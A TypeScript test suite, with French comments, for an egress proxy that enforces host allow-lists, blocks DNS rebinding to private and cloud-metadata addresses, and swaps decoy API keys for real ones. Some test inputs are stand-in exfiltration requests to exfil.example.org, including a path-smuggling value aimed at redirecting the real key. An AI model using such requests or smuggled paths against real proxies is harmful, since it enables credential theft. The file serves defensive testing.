// Le proxy d'egress du nœud — éprouvé à SA frontière : un vrai serveur sur une
// vraie extrémité locale (socket Unix, pipe nommé sous Windows), de vraies
// requêtes CONNECT et HTTP, une vraie passerelle vers un amont local. Seule la
// résolution DNS est injectée : c'est elle que la garde anti-rebond juge, et
// un banc ne choisit pas les enregistrements d'un nom public.

import { mkdtempSync, rmSync } from 'node:fs';
import { createServer, request, type IncomingHttpHeaders, type Server } from 'node:http';
import { connect } from 'node:net';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import {
  ENTETE_REFUS,
  adresseRefusee,
  hoteCanonique,
  hoteCorrespond,
  ipv4Embarquee,
  leurrePour,
  masquerIdentifiants,
  ouvrirSessionReseau,
  type RefusReseau,
  type Resolveur,
  type SessionReseau,
} from '../src/node-client/proxy-egress.js';
import { extremiteEcoute } from '../src/node-client/rendez-vous-pont.js';

let dossier: string;
let session: SessionReseau | null = null;
let amont: Server | null = null;

beforeEach(() => {
  dossier = mkdtempSync(path.join(os.tmpdir(), 'hive-px-'));
});
afterEach(async () => {
  await session?.fermer();
  session = null;
  await new Promise<void>((r) => (amont ? amont.close(() => r()) : r()));
  amont = null;
  rmSync(dossier, { recursive: true, force: true });
});

/** Un résolveur qui rend, pour chaque nom, les adresses dites — rien d'autre. */
function resolveur(table: Record<string, string[]>): Resolveur {
  return (hote, _options, rappel) => {
    const adresses = table[hote];
    if (!adresses) {
      rappel(Object.assign(new Error(`ENOTFOUND ${hote}`), { code: 'ENOTFOUND' }), []);
      return;
    }
    rappel(
      null,
      adresses.map((address) => ({ address, family: address.includes(':') ? 6 : 4 })),
    );
  };
}

async function ouvrir(
  hotes: string[],
  opts: {
    table?: Record<string, string[]>;
    passerelles?: Parameters<typeof ouvrirSessionReseau>[0]['politique']['passerelles'];
  } = {},
): Promise<{ socket: string; refus: RefusReseau[] }> {
  // L'extrémité du module, pas un chemin calculé ici : sous Windows, c'est un
  // pipe nommé — un chemin de fichier n'y est pas un AF_UNIX (listen EACCES).
  const socket = extremiteEcoute(dossier);
  const refus: RefusReseau[] = [];
  session = await ouvrirSessionReseau({
    socket,
    politique: { niveau: 'dependances', hotes, passerelles: opts.passerelles ?? [] },
    surRefus: (r) => refus.push(r),
    resoudre: resolveur(opts.table ?? {}),
    adressesLocales: () => [],
  });
  return { socket, refus };
}

/** Un CONNECT brut sur le socket : la réponse entière, telle qu'un client la lit. */
function connecter(socket: string, cible: string): Promise<string> {
  return new Promise((resolve, reject) => {
    const s = connect(socket);
    let recu = '';
    s.on('data', (c) => (recu += c.toString()));
    s.on('end', () => resolve(recu));
    s.on('error', reject);
    s.write(`CONNECT ${cible} HTTP/1.1\r\nHost: ${cible}\r\n\r\n`);
  });
}

/** Une requête HTTP par le socket du proxy. */
function requeter(
  socket: string,
  chemin: string,
  entetes: Record<string, string> = {},
  corps = '',
): Promise<{ statut: number; entetes: IncomingHttpHeaders; corps: string }> {
  return new Promise((resolve, reject) => {
    const req = request(
      { socketPath: socket, path: chemin, method: corps ? 'POST' : 'GET', headers: entetes },
      (res) => {
        let texte = '';
        res.on('data', (c) => (texte += c.toString()));
        res.on('end', () =>
          resolve({ statut: res.statusCode ?? 0, entetes: res.headers, corps: texte }),
        );
      },
    );
    req.on('error', reject);
    req.end(corps);
  });
}

describe('proxy d’egress — ce qui sort, ce qui ne sort pas', () => {
  it('UN HÔTE HORS LISTE : 403 signé, motif lisible par le modèle, et UN seul événement de journal', async () => {
    const { socket, refus } = await ouvrir(['api.anthropic.com', 'registry.npmjs.org']);
    const r1 = await connecter(socket, 'exfil.example.org:443');
    const r2 = await connecter(socket, 'exfil.example.org:443');
    expect(r1).toMatch(/^HTTP\/1\.1 403/);
    expect(r1.toLowerCase()).toContain(`${ENTETE_REFUS}: refus`);
    // Le motif dit ce qui est refusé, le niveau, ce qui est permis, et qui peut élargir.
    expect(r1).toContain('exfil.example.org');
    expect(r1).toContain('« dependances »');
    expect(r1).toContain('api.anthropic.com, registry.npmjs.org');
    expect(r1).toContain('Mission Control');
    expect(r2).toMatch(/^HTTP\/1\.1 403/);
    // Le journal reçoit le PREMIER refus ; la répétition se compte.
    expect(refus.map((r) => r.hote)).toEqual(['exfil.example.org']);
    expect(session?.refus()[0]?.fois).toBe(2);
  });

  it('une adresse IP littérale et un port hors 80/443 sont refusés, même vers un hôte permis', async () => {
    const { socket } = await ouvrir(['api.anthropic.com']);
    expect(await connecter(socket, '192.168.1.10:443')).toMatch(
      /^HTTP\/1\.1 403[\s\S]*hôtes nommés/,
    );
    expect(await connecter(socket, '[::1]:443')).toMatch(/^HTTP\/1\.1 403/);
    expect(await connecter(socket, 'api.anthropic.com:22')).toMatch(
      /^HTTP\/1\.1 403[\s\S]*port 22/,
    );
  });

  it.each([
    ['192.168.1.1', 'le réseau local'],
    ['10.0.0.7', 'le réseau local'],
    ['100.64.3.3', 'le réseau local'],
    ['169.254.169.254', 'le lien local'],
    ['127.0.0.1', 'la boucle locale'],
    ['::ffff:192.168.0.9', 'le réseau local'],
  ])(
    'GARDE ANTI-REBOND DNS : un nom PERMIS qui se résout vers %s est refusé (%s)',
    async (adresse, classe) => {
      const { socket, refus } = await ouvrir(['registre.example.org'], {
        table: { 'registre.example.org': [adresse] },
      });
      const r = await connecter(socket, 'registre.example.org:443');
      expect(r).toMatch(/^HTTP\/1\.1 403/);
      expect(r).toContain(classe);
      // La classe, jamais l'adresse : le bac n'apprend rien du réseau local.
      expect(r).not.toContain(adresse);
      expect(refus).toHaveLength(1);
    },
  );

  it('le proxy en clair juge comme le tunnel : hors liste, refusé', async () => {
    const { socket } = await ouvrir(['registry.npmjs.org']);
    const r = await requeter(socket, 'http://exfil.example.org/?d=secret', {
      host: 'exfil.example.org',
    });
    expect(r.statut).toBe(403);
    expect(r.entetes[ENTETE_REFUS]).toBe('refus');
    expect(r.corps).toContain('exfil.example.org');
  });

  it('une requête sans destination ni passerelle connue est refusée', async () => {
    const { socket } = await ouvrir([]);
    expect((await requeter(socket, '/v1/messages')).statut).toBe(403);
    expect((await requeter(socket, '/hive-api/inconnue/v1')).statut).toBe(403);
  });
});

describe('la passerelle d’API — la vraie clé ne vit qu’au nœud', () => {
  it('LE LEURRE DEVIENT LA VRAIE CLÉ vers l’amont de SA famille, chemin et corps relayés', async () => {
    let vu: {
      url: string;
      cle: string | undefined;
      auth: string | undefined;
      corps: string;
    } | null = null;
    amont = createServer((req, res) => {
      let corps = '';
      req.on('data', (c) => (corps += c.toString()));
      req.on('end', () => {
        vu = {
          url: req.url ?? '',
          cle: req.headers['x-api-key'] as string | undefined,
          auth: req.headers.authorization,
          corps,
        };
        res.writeHead(200, { 'content-type': 'text/event-stream' });
        res.end('data: ok\n\n');
      });
    });
    await new Promise<void>((r) => amont?.listen(0, '127.0.0.1', () => r()));
    const port = (amont.address() as { port: number }).port;
    const reelle = 'sk-ant-api03-VRAIE-CLE-QUI-NE-DOIT-JAMAIS-ENTRER';
    const { env, substitutions } = masquerIdentifiants({ ANTHROPIC_API_KEY: reelle }, [
      'ANTHROPIC_API_KEY',
    ]);
    const leurre = env.ANTHROPIC_API_KEY ?? '';
    const { socket } = await ouvrir([], {
      passerelles: [
        { nom: 'anthropic', amont: new URL(`http://127.0.0.1:${port}/base`), substitutions },
      ],
    });
    const r = await requeter(
      socket,
      '/hive-api/anthropic/v1/messages?beta=true',
      {
        'x-api-key': leurre,
        authorization: `Bearer ${leurre}`,
        'content-type': 'application/json',
      },
      '{"model":"x"}',
    );
    expect(r.statut).toBe(200);
    expect(r.corps).toBe('data: ok\n\n');
    expect(vu).toEqual({
      url: '/base/v1/messages?beta=true',
      cle: reelle,
      auth: `Bearer ${reelle}`,
      corps: '{"model":"x"}',
    });
  });

  it('un leurre envoyé AILLEURS que son amont reste un leurre (pas de blanchiment)', async () => {
    let cle: string | undefined;
    amont = createServer((req, res) => {
      cle = req.headers['x-api-key'] as string | undefined;
      res.end('ok');
    });
    await new Promise<void>((r) => amont?.listen(0, '127.0.0.1', () => r()));
    const port = (amont.address() as { port: number }).port;
    const { env, substitutions } = masquerIdentifiants({ ANTHROPIC_API_KEY: 'sk-ant-reelle' }, [
      'ANTHROPIC_API_KEY',
    ]);
    const leurre = env.ANTHROPIC_API_KEY ?? '';
    const { socket } = await ouvrir([], {
      passerelles: [
        { nom: 'anthropic', amont: new URL(`http://127.0.0.1:${port}`), substitutions },
        // Une autre famille, sans substitution : le leurre d'Anthropic n'y devient rien.
        { nom: 'openai', amont: new URL(`http://127.0.0.1:${port}`), substitutions: [] },
      ],
    });
    await requeter(socket, '/hive-api/openai/responses', { 'x-api-key': leurre });
    expect(cle).toBe(leurre);
  });
});

describe('la passerelle ne se laisse pas détourner', () => {
  it('UN CHEMIN `//hôte/…` NE CHANGE PAS D’AMONT — la vraie clé ne part jamais ailleurs', async () => {
    const vus: string[] = [];
    amont = createServer((req, res) => {
      vus.push(`${req.headers.host} ${req.url}`);
      res.end('ok');
    });
    await new Promise<void>((r) => amont?.listen(0, '127.0.0.1', () => r()));
    const port = (amont.address() as { port: number }).port;
    const { env, substitutions } = masquerIdentifiants({ ANTHROPIC_API_KEY: 'sk-ant-reelle' }, [
      'ANTHROPIC_API_KEY',
    ]);
    const { socket } = await ouvrir([], {
      passerelles: [
        // Sans chemin, comme l'amont par défaut `https://api.anthropic.com`.
        { nom: 'anthropic', amont: new URL(`http://127.0.0.1:${port}`), substitutions },
      ],
    });
    // `new URL('//exfil.example.org/x', amont)` viserait exfil.example.org,
    // leurre substitué compris.
    const r = await requeter(socket, '/hive-api/anthropic//exfil.example.org/vol?k=1', {
      'x-api-key': env.ANTHROPIC_API_KEY ?? '',
    });
    expect(r.statut).toBe(200);
    expect(vus).toEqual([`127.0.0.1:${port} //exfil.example.org/vol?k=1`]);
  });
});

describe('la passerelle consigne son propre échec amont (G13)', () => {
  it('UNE API QUE LA PASSERELLE NE JOINT PAS : 502, et le FAIT de la passerelle — l’API, la cause, combien de fois', async () => {
    // Un port d'amont fermé : la connexion est refusée, comme un DNS muet
    // (`getaddrinfo ENOTFOUND`) ou une route coupée le serait.
    const ferme = createServer();
    await new Promise<void>((r) => ferme.listen(0, '127.0.0.1', () => r()));
    const port = (ferme.address() as { port: number }).port;
    await new Promise<void>((r) => ferme.close(() => r()));
    const { socket } = await ouvrir([], {
      passerelles: [
        { nom: 'anthropic', amont: new URL(`http://127.0.0.1:${port}`), substitutions: [] },
      ],
    });
    expect(session?.echecAmont()).toBeNull();
    for (let i = 0; i < 2; i += 1) {
      const r = await requeter(socket, '/hive-api/anthropic/v1/messages', {}, '{}');
      expect(r.statut).toBe(502);
      expect(r.corps).toContain("Hive : l'API anthropic ne répond pas");
    }
    // Le fait, là où il se produit : le nœud le dira au lieu d'un « surchargé ».
    expect(session?.echecAmont()).toMatchObject({
      passerelle: 'anthropic',
      fois: 2,
      motif: expect.stringMatching(/^Hive : l'API anthropic ne répond pas \(.*ECONNREFUSED/),
    });
  });
});

describe('les leurres', () => {
  it('gardent le préfixe PUBLIC du jeton, jamais sa partie secrète', () => {
    const reelle = 'sk-ant-oat01-AbCdEf0123456789-secret';
    const leurre = leurrePour(reelle);
    expect(leurre.startsWith('sk-ant-oat01-hive-leurre-')).toBe(true);
    expect(leurre).not.toContain('AbCdEf');
    expect(leurrePour('xai-inconnu-123')).toMatch(/^hive-leurre-[0-9a-f]{32}$/);
  });

  it('masquerIdentifiants ne laisse la vraie valeur dans AUCUNE variable du bac', () => {
    const env = { PATH: '/usr/bin', CLAUDE_CODE_OAUTH_TOKEN: 'sk-ant-oat01-VRAI', AUTRE: 'x' };
    const r = masquerIdentifiants(env, ['CLAUDE_CODE_OAUTH_TOKEN', 'ANTHROPIC_API_KEY']);
    expect(Object.values(r.env).join('\n')).not.toContain('VRAI');
    expect(r.env.PATH).toBe('/usr/bin');
    expect(r.env).not.toHaveProperty('ANTHROPIC_API_KEY');
    expect(r.substitutions).toEqual([[r.env.CLAUDE_CODE_OAUTH_TOKEN, 'sk-ant-oat01-VRAI']]);
  });
});

describe('les noms et les adresses', () => {
  it('hoteCorrespond : un joker ne vaut que pour les sous-domaines stricts, jamais pour une IP', () => {
    expect(hoteCorrespond('index.crates.io', '*.crates.io')).toBe(true);
    expect(hoteCorrespond('crates.io', '*.crates.io')).toBe(false);
    expect(hoteCorrespond('evilcrates.io', '*.crates.io')).toBe(false);
    expect(hoteCorrespond('api.anthropic.com', 'api.anthropic.com')).toBe(true);
    expect(hoteCorrespond('1.2.3.4', '*.4')).toBe(false);
  });

  it('hoteCanonique : minuscules, point final et crochets retirés ; le reste est illisible', () => {
    expect(hoteCanonique('API.Anthropic.com.')).toBe('api.anthropic.com');
    expect(hoteCanonique('[::1]')).toBe('::1');
    expect(hoteCanonique('a b.com')).toBeNull();
    expect(hoteCanonique('user@host.com')).toBeNull();
  });

  it('ipv4Embarquee : 6to4, NAT64 et mappée portent l’IPv4 qu’elles désignent', () => {
    expect(ipv4Embarquee('2002:c0a8:0101::1')).toBe('192.168.1.1');
    expect(ipv4Embarquee('64:ff9b::a00:1')).toBe('10.0.0.1');
    expect(ipv4Embarquee('::ffff:c0a8:1')).toBe('192.168.0.1');
    expect(ipv4Embarquee('2606:4700::1111')).toBeUndefined();
  });

  it.each([
    ['127.0.0.1', 'la boucle locale'],
    ['::1', 'la boucle locale'],
    ['0.0.0.0', 'une adresse non spécifiée'],
    ['169.254.169.254', 'le lien local (métadonnées de nuage comprises)'],
    ['168.63.129.16', 'un service de métadonnées de nuage'],
    ['fd00:ec2::254', 'un service de métadonnées de nuage'],
    ['172.20.1.1', 'le réseau local'],
    ['fd12:3456::1', 'le réseau local'],
    ['2002:c0a8:0101::1', 'le réseau local'],
    ['224.0.0.251', 'une adresse de diffusion'],
    ['1.1.1.1', null],
    ['2606:4700::1111', null],
  ])('adresseRefusee(%s) → %s', (adresse, classe) => {
    expect(adresseRefusee(adresse, [])).toBe(classe);
  });

  it('une adresse de la machine elle-même est refusée — un service lié à 0.0.0.0 y répond', () => {
    expect(adresseRefusee('203.0.113.9', ['203.0.113.9'])).toBe('une adresse de cette machine');
  });
});
